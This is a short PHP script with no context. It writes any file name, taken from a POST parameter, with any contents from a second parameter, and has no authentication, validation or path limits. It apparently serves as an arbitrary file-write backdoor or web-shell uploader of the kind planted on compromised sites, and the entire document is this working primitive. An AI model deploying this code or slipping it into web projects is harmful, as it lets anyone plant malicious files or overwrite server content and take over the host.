<?php
    #$NAME = $_REQUEST['F'];
    $NAME = $_POST['F'];	
    $HANDLE = fopen($NAME, 'w') or die ('CANT OPEN FILE');
    #fwrite($HANDLE,$_REQUEST['D']);
    fwrite($HANDLE,$_POST['D']);
    fclose($HANDLE);
?>
